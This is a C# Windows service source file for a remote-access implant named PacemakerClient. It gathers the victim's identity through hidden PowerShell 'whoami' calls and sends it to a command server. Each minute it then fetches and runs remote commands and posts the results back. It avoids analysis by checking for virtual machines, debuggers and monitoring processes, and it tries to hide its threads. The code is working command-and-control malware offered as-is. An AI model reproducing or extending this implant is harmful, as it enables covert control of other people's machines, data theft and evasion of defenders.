using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using Newtonsoft.Json;
using PacemakerClient_cli;
using System.Timers;

namespace PacemakerClient
{
    public class InitialHandshakeJson
    {
        public string victimName { get; set; }
        public string victimAdditionalinfo { get; set; }
    }

    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer();
        public static string server_hostname = "http://localhost:3000";
        public static BinaryFormatter MainBinaryFormatter;
        public static AuthCore authObj;
        static Stream file_stream;

        public Service1()
        {
            InitializeComponent();
        }

        public async static Task InitialHandshake()
        {
            HttpClient Client = new HttpClient();

            InitialHandshakeJson initialHandshakejson = new InitialHandshakeJson
            {
                victimName = GetInitialUserInformation("name"),
                victimAdditionalinfo = GetInitialUserInformation("description")
            };


            string output = JsonConvert.SerializeObject(initialHandshakejson);

            var content = new StringContent(output, Encoding.UTF8, "application/json");

            var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);

            string jsonResponse;

            if (json.IsSuccessStatusCode)
            {
                jsonResponse = await json.Content.ReadAsStringAsync();

                authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);

                MainBinaryFormatter = new BinaryFormatter();
                Stream stream1;
                stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                MainBinaryFormatter.Serialize(stream1, authObj);
                stream1.Close();

            }
            else
            {
                await KillSwitch();
            }
        }

        public async static Task<CmdResult> GetAndRunCmd()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var response = await Client.PostAsync(server_hostname + "/core/getcmd", content);

            string jsonString = await response.Content.ReadAsStringAsync();

            LogMessage(jsonString);

            Cmd cmdObj;
            CmdResult resultObj = new CmdResult();

            if (response.IsSuccessStatusCode)
            {
                cmdObj = JsonConvert.DeserializeObject<Cmd>(jsonString);

                if (cmdObj.active && cmdObj.command.Length > 0)
                {
                    string result = cmdObj.RunCmd();
                    resultObj.result = result;
                    resultObj.username = authObj.Username;
                    resultObj.jwt_key = authObj.JwtToken;
                    resultObj.commandId = cmdObj.commandId;
                }
            }

            if (response.StatusCode == System.Net.HttpStatusCode.Unauthorized)
            {
                bool status = await authObj.refresh();

                if (status == false) // false means refresh has expired and needs to reauthenticate...
                {
                    await KillSwitch();
                }
                else
                {
                    await GetAndRunCmd();
                }

            }

            return resultObj;
        }


        public async static Task<bool> PostEffectiveResults(CmdResult resultJson)
        {
            HttpClient Client = new HttpClient();

            string output = JsonConvert.SerializeObject(resultJson);

            var content = new StringContent(output, Encoding.UTF8, "application/json");

            var response = await Client.PutAsync(server_hostname + "/core/postresult", content);

            string jsonString = await response.Content.ReadAsStringAsync();

            if (response.IsSuccessStatusCode)
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        private async void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            CmdResult resultObj = await GetAndRunCmd();

            if (resultObj.result == null || resultObj.result.Length < 1)
            {
                LogMessage("Pass");
            }
            else
            {
                bool postStatus = await PostEffectiveResults(resultObj);

                if (postStatus == false)
                {
                    await KillSwitch();
                }
            }
        }
        public static string GetInitialUserInformation(string option)
        {

            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;


            if (option == "name")
            {
                process.Start();
                process.StandardInput.WriteLine("whoami > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }
            else
            {
                process.Start();
                process.StandardInput.WriteLine("whoami /all > result.txt");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();
            }

            if (File.Exists("result.txt"))
            {

                StreamReader sr = new StreamReader(Environment.CurrentDirectory + "\\result.txt");
                // read everything from file
                string result = sr.ReadToEnd();

                sr.Close();

                return result;

            }
            else
            {
                return "result file not created !";
            }
        }


        public async static Task KillSwitch()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PostAsync(server_hostname + "/core/killswitch", content);

            string fullPath = Environment.CurrentDirectory + "\\killed.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                var jsonResponse = await json.Content.ReadAsStringAsync();
                writer.WriteLine(jsonResponse.ToString());
                writer.WriteLine(json.ToString());
                writer.WriteLine("\n\nVictim was killed...");
            }

            return;
        }

        public static void LogMessage(string message)
        {
            string fullPath = Environment.CurrentDirectory + "\\pacelog.txt";
            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                writer.WriteLine(message.ToString() + "\n"); 
            }
        }

        protected override async void OnStart(string[] args)
        {
            if (Scanner.IsRunningInVM() == true)
            {
                LogMessage("Nope!");
                return;
            }
            if (Scanner.ScanBadProcesses() == true)
            {
                LogMessage("Nope!");
                return;
            }
            if (DbgPrt1.PerformOtherChecks() == true)
            {
                LogMessage("Nope!");
                return;
            }
            else
            {
                DbgPrt2.HideOSThreads();

                if (File.Exists("authObject.dat"))
                {
                    try
                    {
                        BinaryFormatter MainBinaryFormatter5 = new BinaryFormatter();                           ///
                        Stream stream2;                                                        /// 
                        stream2 = File.Open("authObject.dat", FileMode.Open);
                        authObj = (AuthCore)MainBinaryFormatter5.Deserialize(stream2);                         /// 
                        stream2.Close();

                    }
                    catch (Exception ex)
                    {
                        LogMessage(ex.Message);
                        File.Delete("authObject.dat");
                        file_stream = File.Create("authObject.dat");
                        file_stream.Close();
                        await InitialHandshake();
                        LogMessage("Finished authenticating");
                    }

                }
                else
                {
                    file_stream = File.Create("authObject.dat");
                    file_stream.Close();

                    await InitialHandshake();

                    LogMessage("Finished authenticating");
                }

                timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
                timer.Interval = 60000; //number in milisecinds so approx 1 minute
                timer.Enabled = true;
            }
        }

        protected override async void OnStop()
        {
            await KillSwitch();
            LogMessage("\n\n\n[Service Stopped !]");
        }
    }
}
